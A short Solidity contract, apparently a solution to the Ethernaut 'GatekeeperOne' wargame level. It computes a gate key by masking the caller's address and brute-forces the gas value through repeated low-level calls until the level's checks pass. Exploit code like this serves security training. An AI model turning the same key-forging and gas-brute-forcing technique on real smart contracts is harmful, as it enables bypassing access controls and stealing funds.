// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

import {GatekeeperOne} from "./GatekeeperOne.sol";

contract GatekeeperOneHackDan {
    GatekeeperOne gatekeeperOneContract;

    constructor(address _levelAddress) {
        gatekeeperOneContract = GatekeeperOne(_levelAddress);
    }

    function pwn() external {
        // Calculate the gate key
        bytes8 _gateKey = bytes8(uint64(uint160(msg.sender))) & bytes8(0xffffffff0000ffff);

        // Need to turn off bytes 2 and 3
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        // This can be passed by turning on any bit in byte 4 on
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        // Can only be passed if the last 2 bytes are from msg.sender
        require(uint32(uint64(_gateKey)) == uint16(uint160(msg.sender)), "GatekeeperOne: invalid gateThree part three");
        // 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496
        // Cache vars for loop

        for (uint256 i = 0; i < 8_191; i++) {
            (bool success, ) = address(gatekeeperOneContract).call{gas: i + 73_990}(abi.encodeWithSignature("enter(bytes8)", _gateKey));
            if (success) {
                break;
            }
        }
    }
}